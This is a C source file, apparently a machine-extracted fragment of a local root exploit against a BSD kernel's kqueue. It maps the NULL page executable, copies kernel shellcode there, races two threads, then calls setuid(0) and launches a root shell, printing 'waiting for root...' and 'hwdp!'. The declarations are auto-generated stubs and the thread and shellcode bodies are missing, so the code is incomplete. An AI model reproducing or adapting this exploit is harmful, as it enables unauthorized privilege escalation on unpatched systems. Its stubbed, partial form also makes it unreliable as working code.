
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int pthread_t ;
struct TYPE_2__ {int tv_nsec; scalar_t__ tv_sec; } ;


 int MAP_ANON ;
 int MAP_FIXED ;
 int PROT_EXEC ;
 int PROT_READ ;
 int PROT_WRITE ;
 int code_end ;
 scalar_t__ do_thread ;
 scalar_t__ do_thread2 ;
 int execl (char*,char*,int *) ;
 scalar_t__ getuid () ;
 int gotroot ;
 int kernel_code ;
 int kq ;
 int kqueue () ;
 int memcpy (int ,int *,int) ;
 scalar_t__ mmap (int ,int,int,int,int,int ) ;
 int perror (char*) ;
 int printf (char*) ;
 int pthread_create (int *,int *,void*,int *) ;
 int setuid (int ) ;
 TYPE_1__ timeout ;
 int usleep (int) ;

int main(void) {
 int i;
 pthread_t pth, pth2;

 if (mmap(0, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_FIXED, -1, 0) < 0) {
  perror("mmap");
  return -1;
 }

 memcpy(0, &kernel_code, &code_end - &kernel_code);

 if ((kq = kqueue()) < 0) {
  perror("kqueue");
  return -1;
 }

 pthread_create(&pth, ((void*)0), (void *)do_thread, ((void*)0));
 pthread_create(&pth2, ((void*)0), (void *)do_thread2, ((void*)0));

 timeout.tv_sec = 0;
 timeout.tv_nsec = 1;

 printf("waiting for root...\n");
 i = 0;

 while (!gotroot && i++ < 10000)
  usleep(100);

 setuid(0);

 if (getuid()) {
  printf("failed - system patched or not MP\n");
  return -1;
 }

 printf("hwdp!\n");

 execl("/bin/sh", "sh", ((void*)0));

 return 0;
}
